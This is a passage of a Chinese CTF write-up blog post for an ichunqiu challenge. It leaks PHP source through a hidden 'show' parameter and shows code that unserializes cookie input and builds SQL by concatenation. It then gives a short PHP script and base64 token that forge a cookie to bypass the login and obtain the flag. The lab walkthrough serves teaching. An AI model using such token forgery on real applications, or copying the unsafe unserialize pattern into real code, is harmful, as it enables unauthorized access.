+<p>然后就抓包改包呗：<br>我们在包里随便找个地方加上这个参数：<code>show:1</code><br>然后发包会看到页面把源代码给我们返回了过来<br><img src="i春秋CTF/58.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	include &#39;common.php&#39;;</span><br><span class="line">	$requset &#x3D; array_merge($_GET, $_POST, $_SESSION, $_COOKIE);</span><br><span class="line">	class db</span><br><span class="line">	&#123;</span><br><span class="line">		public $where;</span><br><span class="line">		function __wakeup()</span><br><span class="line">		&#123;</span><br><span class="line">			if(!empty($this-&gt;where))</span><br><span class="line">			&#123;</span><br><span class="line">				$this-&gt;select($this-&gt;where);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		function select($where)</span><br><span class="line">		&#123;</span><br><span class="line">			$sql &#x3D; mysql_query(&#39;select * from user where &#39;.$where);</span><br><span class="line">			return @mysql_fetch_array($sql);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if(isset($requset[&#39;token&#39;]))</span><br><span class="line">	&#123;</span><br><span class="line">		$login &#x3D; unserialize(gzuncompress(base64_decode($requset[&#39;token&#39;])));</span><br><span class="line">		$db &#x3D; new db();</span><br><span class="line">		$row &#x3D; $db-&gt;select(&#39;user&#x3D;\&#39;&#39;.mysql_real_escape_string($login[&#39;user&#39;]).&#39;\&#39;&#39;);</span><br><span class="line">		if($login[&#39;user&#39;] &#x3D;&#x3D;&#x3D; &#39;ichunqiu&#39;)</span><br><span class="line">		&#123;</span><br><span class="line">			echo $flag;</span><br><span class="line">		&#125;else if($row[&#39;pass&#39;] !&#x3D;&#x3D; $login[&#39;pass&#39;])&#123;</span><br><span class="line">			echo &#39;unserialize injection!!&#39;;</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			echo &quot;乱码&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		header(&#39;Location: index.php?error&#x3D;1&#39;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>然后就是代码审计了，从代码中可以看到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">需要满足 $login[&#39;user&#39;] &#x3D;&#x3D;&#x3D; &#39;ichunqiu&#39;</span><br><span class="line">而user被$login &#x3D; unserialize(gzuncompress(base64_decode($requset[&#39;token&#39;])));处理过</span><br></pre></td></tr></table></figure><br>那么就给他反过来执行一遍：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; array(&quot;user&quot; &#x3D;&gt; &quot;ichunqiu&quot;);</span><br><span class="line">$a &#x3D; base64_encode(gzcompress(serialize($a)));</span><br><span class="line">echo $a;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>得到了一串base64编码：<code>eJxLtDK0qi62MrFSKi1OLVKyLraysFLKTM4ozSvMLFWyrgUAo4oKXA==</code></p>
+<p>然后我们在Cookie中加上token参数，将它放进去</p>
+<p><img src="i春秋CTF/59.png" alt=""><br>得到flag</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/" data-id="ck4saoxds0004vguy4yczba5m" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/09/10/%E7%A5%9E%E5%99%A8Githack/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          神器Githack
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/09/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%A5%9E%E5%99%A8burpsuite/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">渗透测试神器burpsuite</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CMS/" rel="tag">CMS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%94%BB%E9%98%B2/" rel="tag">攻防</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CMS/" style="font-size: 20px;">CMS</a> <a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/docker/" style="font-size: 10px;">docker</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a> <a href="/tags/%E6%94%BB%E9%98%B2/" style="font-size: 10px;">攻防</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2018/11/15/PHP%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/">PHP特性总结</a>
+          </li>
+        
+          <li>
+            <a href="/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/">2018WEB安全测试秋季预选赛</a>
+          </li>
+        
+          <li>
+            <a href="/2018/10/19/%E6%B5%B7%E6%B4%8BCMS/">海洋CMS</a>
+          </li>
+        
+          <li>
+            <a href="/2018/10/05/docker%E5%BF%83%E5%BE%97/">docker心得</a>
+          </li>
+        
+          <li>
+            <a href="/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/">再见CMS--齐博CMS</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
